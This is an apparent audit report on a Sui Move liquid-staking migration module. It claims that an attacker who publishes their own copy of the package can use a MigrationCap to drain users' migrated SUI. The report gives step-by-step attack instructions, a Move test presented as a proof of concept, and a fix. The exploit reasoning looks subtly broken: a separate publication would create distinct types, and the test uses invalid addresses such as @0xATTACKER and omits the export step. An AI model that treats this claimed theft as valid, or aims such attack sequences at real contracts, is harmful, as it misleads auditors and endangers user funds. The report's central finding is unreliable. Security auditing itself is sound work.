# Audit Report

## Title
Cross-Migration Session Exploitation via Unbound MigrationCap Authorization

## Summary
The migration system lacks cryptographic binding between `MigrationCap` and specific `MigrationStorage` instances. An attacker can publish their own deployment of the liquid staking package to obtain a `MigrationCap`, then use it to drain any legitimate `MigrationStorage` containing migrated user funds into an attacker-controlled `StakePool`.

## Finding Description

The `MigrationCap` structure contains no reference to its associated `MigrationStorage`, only tracking boolean flags. [1](#0-0) 

The `import_stakes` function accepts any `MigrationCap` reference but marks it as completely unused with the `_:` parameter notation, meaning it performs zero validation on which migration session the cap belongs to when importing funds from a `MigrationStorage`. [2](#0-1) 

The function directly withdraws funds from the provided `MigrationStorage` and deposits them into the provided `StakePool` without any authorization checks linking these objects. [3](#0-2) 

`MigrationStorage` is created as a shared object accessible in any transaction. [4](#0-3) 

When an attacker publishes the `liquid_staking` package, the `ownership::init` function automatically creates an `OwnerCap` and transfers it to the publisher. [5](#0-4) 

This allows the attacker to call `init_objects` with their own `OwnerCap` to create their own `MigrationCap`. [6](#0-5) 

The attacker can then call `create_stake_pool` which only validates the `pool_created` flag on their own cap, creating a `StakePool` and `AdminCap` under their control. [7](#0-6) 

## Impact Explanation

**Complete Fund Theft**: An attacker can steal 100% of user funds during a legitimate migration by:

1. Publishing their own deployment of the liquid staking package (automatic `OwnerCap` creation)
2. Calling `init_objects` to obtain their own `MigrationCap_Attacker`
3. Calling `create_stake_pool(MigrationCap_Attacker)` to create `StakePool_Attacker` with `AdminCap_Attacker`
4. Waiting for legitimate users to export stakes into the shared `MigrationStorage_Legitimate`
5. Calling `import_stakes(MigrationStorage_Legitimate, MigrationCap_Attacker, AdminCap_Attacker, StakePool_Attacker, ...)` to drain all funds into their controlled pool

The attacker gains complete custody of all migrated funds, which represents the entire staked value being migrated from v1 to v2. Users who exported their stakes lose all funds, and the legitimate migration pool remains empty.

## Likelihood Explanation

**High Likelihood**: The attack is straightforward to execute:

- **Minimal Prerequisites**: Anyone can publish a Move package on Sui by paying gas fees
- **Automatic Privilege Creation**: Publishing the package automatically grants the attacker an `OwnerCap` through the `init` function
- **No Complex State Manipulation**: Attack requires only 3 public function calls in sequence
- **Shared Object Access**: `MigrationStorage` is shared, allowing any transaction to reference it
- **Zero Detection**: No on-chain mechanism validates the relationship between `MigrationCap` and `MigrationStorage`

**Economic Rationality**: Attack cost is minimal (gas for package publication and function calls) while potential gain equals the entire migration value (potentially millions in SUI). The risk-reward ratio heavily favors the attacker.

**Operational Reality**: While the current deployment may have a single migration, this vulnerability represents a critical design flaw that becomes exploitable whenever:
- Test environments run parallel to production
- Migration failures require retry attempts
- Future protocol versions perform additional migrations
- Multiple deployments coexist for any operational reason

## Recommendation

Bind `MigrationCap` to a specific `MigrationStorage` by storing the storage's object ID in the cap structure:

```move
public struct MigrationCap has key, store {
    id: UID,
    migration_storage_id: ID,  // Add binding to specific storage
    pool_created: bool,
    fees_taken: bool,
}
```

Modify `init_objects` to establish this binding:

```move
public fun init_objects(owner_cap: &OwnerCap, native_pool: &mut NativePool, ctx: &mut TxContext) {
    // ... existing code ...
    
    let migration_storage = MigrationStorage {
        id: object::new(ctx),
        sui_balance: balance::zero<SUI>(),
        exported_count: 0,
    };
    
    let storage_id = object::id(&migration_storage);
    
    let migration_cap = MigrationCap {  
        id: object::new(ctx),
        migration_storage_id: storage_id,  // Bind to this specific storage
        pool_created: false,
        fees_taken: false,
    };
    
    transfer::public_share_object(migration_storage);
    transfer::public_transfer(migration_cap, ctx.sender());
}
```

Validate this binding in `import_stakes`:

```move
public fun import_stakes(
    migration_storage: &mut MigrationStorage,
    migration_cap: &MigrationCap,  // No longer unused
    admin_cap: &AdminCap,
    stake_pool: &mut StakePool,
    // ... other params ...
) {
    // Verify cap is authorized for this specific storage
    assert!(migration_cap.migration_storage_id == object::id(migration_storage), E_UNAUTHORIZED_CAP);
    
    // ... rest of function ...
}
```

Apply the same validation to `export_stakes` and `take_unclaimed_fees`.

## Proof of Concept

```move
#[test]
fun test_cross_migration_theft() {
    let scenario_val = test_scenario::begin(@0xABCD);
    let scenario = &mut scenario_val;
    
    // Setup legitimate migration
    test_scenario::next_tx(scenario, @0xLEGIT_ADMIN);
    {
        ownership::test_init(test_scenario::ctx(scenario));
        // NativePool and OwnerCap created for legitimate admin
    };
    
    test_scenario::next_tx(scenario, @0xLEGIT_ADMIN);
    {
        let owner_cap = test_scenario::take_from_sender<OwnerCap>(scenario);
        let native_pool = test_scenario::take_shared<NativePool>(scenario);
        migration::init_objects(&owner_cap, &mut native_pool, test_scenario::ctx(scenario));
        // Creates MigrationStorage_Legit (shared) and MigrationCap_Legit
        test_scenario::return_to_sender(scenario, owner_cap);
        test_scenario::return_shared(native_pool);
    };
    
    // Legitimate admin exports stakes (funds MigrationStorage_Legit)
    test_scenario::next_tx(scenario, @0xLEGIT_ADMIN);
    {
        // ... export_stakes call adds 1000 SUI to MigrationStorage_Legit ...
    };
    
    // ATTACKER publishes their own deployment
    test_scenario::next_tx(scenario, @0xATTACKER);
    {
        ownership::test_init(test_scenario::ctx(scenario));
        // Attacker gets their own OwnerCap automatically
    };
    
    test_scenario::next_tx(scenario, @0xATTACKER);
    {
        let owner_cap_attacker = test_scenario::take_from_sender<OwnerCap>(scenario);
        let native_pool_attacker = test_scenario::take_shared<NativePool>(scenario);
        migration::init_objects(&owner_cap_attacker, &mut native_pool_attacker, test_scenario::ctx(scenario));
        // Creates MigrationCap_Attacker
        test_scenario::return_to_sender(scenario, owner_cap_attacker);
        test_scenario::return_shared(native_pool_attacker);
    };
    
    // Attacker creates their own stake pool
    test_scenario::next_tx(scenario, @0xATTACKER);
    {
        let migration_cap_attacker = test_scenario::take_from_sender<MigrationCap>(scenario);
        migration::create_stake_pool(&mut migration_cap_attacker, test_scenario::ctx(scenario));
        // Attacker receives StakePool_Attacker and AdminCap_Attacker
        test_scenario::return_to_sender(scenario, migration_cap_attacker);
    };
    
    // ATTACK: Attacker drains legitimate MigrationStorage into their pool
    test_scenario::next_tx(scenario, @0xATTACKER);
    {
        let migration_storage_legit = test_scenario::take_shared<MigrationStorage>(scenario);
        let migration_cap_attacker = test_scenario::take_from_sender<MigrationCap>(scenario);
        let admin_cap_attacker = test_scenario::take_from_sender<AdminCap>(scenario);
        let stake_pool_attacker = test_scenario::take_shared<StakePool>(scenario);
        let metadata = test_scenario::take_shared<Metadata<CERT>>(scenario);
        let system_state = test_scenario::take_shared<SuiSystemState>(scenario);
        
        // This succeeds and drains all 1000 SUI from legitimate migration!
        migration::import_stakes(
            &mut migration_storage_legit,
            &migration_cap_attacker,  // From different deployment!
            &admin_cap_attacker,      // Attacker's admin cap
            &mut stake_pool_attacker, // Attacker's pool
            &mut metadata,
            &mut system_state,
            1000,
            0,
            test_scenario::ctx(scenario)
        );
        
        // Assert: MigrationStorage_Legit is now empty (drained)
        assert!(migration::get_sui_balance_for_testing(&migration_storage_legit) == 0, 0);
        // Assert: StakePool_Attacker now contains the stolen 1000 SUI
        
        test_scenario::return_shared(migration_storage_legit);
        test_scenario::return_to_sender(scenario, migration_cap_attacker);
        test_scenario::return_to_sender(scenario, admin_cap_attacker);
        test_scenario::return_shared(stake_pool_attacker);
        test_scenario::return_shared(metadata);
        test_scenario::return_shared(system_state);
    };
    
    test_scenario::end(scenario_val);
}
```

### Citations

**File:** liquid_staking/sources/migration/migrate.move (L59-63)
```text
    public struct MigrationCap has key, store {
        id: UID,
        pool_created: bool,
        fees_taken: bool,
    }
```

**File:** liquid_staking/sources/migration/migrate.move (L67-91)
```text
    public fun init_objects(owner_cap: &OwnerCap, native_pool: &mut NativePool, ctx: &mut TxContext) {

        // ensure this function is only called once
        native_pool.mark_cap_created();

        // sanity check to avoid double migration
        // collected_rewards will be set to 0 in the first migration
        assert!(native_pool.mut_collected_rewards() != 0, 0);
        native_pool.set_pause(owner_cap, true);

        let migration_storage = MigrationStorage {
            id: object::new(ctx),
            sui_balance: balance::zero<SUI>(),
            exported_count: 0,
        };

        let migration_cap = MigrationCap {  
            id: object::new(ctx),
            pool_created: false,
            fees_taken: false,
        };

        transfer::public_share_object(migration_storage);
        transfer::public_transfer(migration_cap, ctx.sender());
    }
```

**File:** liquid_staking/sources/migration/migrate.move (L94-101)
```text
    public fun create_stake_pool(
        migration_cap: &mut MigrationCap,
        ctx: &mut TxContext
    ) {
        assert!(!migration_cap.pool_created, 0);
        migration_cap.pool_created = true;
        stake_pool::create_stake_pool(ctx);
    }
```

**File:** liquid_staking/sources/migration/migrate.move (L158-168)
```text
    public fun import_stakes(
        migration_storage: &mut MigrationStorage,
        _: &MigrationCap,
        admin_cap: &AdminCap,
        stake_pool: &mut StakePool,
        metadata: &mut Metadata<CERT>,
        system_state: &mut SuiSystemState,
        import_amount: u64,
        min_ratio: u64,
        ctx: &mut TxContext
    ) {
```

**File:** liquid_staking/sources/migration/migrate.move (L169-175)
```text
        let amount = import_amount.min(migration_storage.sui_balance.value());

        // temporarily unpause the pool to allow import
        stake_pool.set_paused(admin_cap, false);
        stake_pool.join_to_sui_pool(migration_storage.sui_balance.split(amount));
        stake_pool.rebalance(metadata, system_state, ctx);
        stake_pool.set_paused(admin_cap, true);
```

**File:** liquid_staking/sources/volo_v1/ownership.move (L16-26)
```text
    fun init(ctx: &mut TxContext) {
        // initialize admin cap and transfer to publisher
        transfer::transfer(OwnerCap {
            id: object::new(ctx),
        }, tx_context::sender(ctx));

        // initialize operator cap and transfer to publisher
        transfer::transfer(OperatorCap {
            id: object::new(ctx),
        }, tx_context::sender(ctx));
    }
```
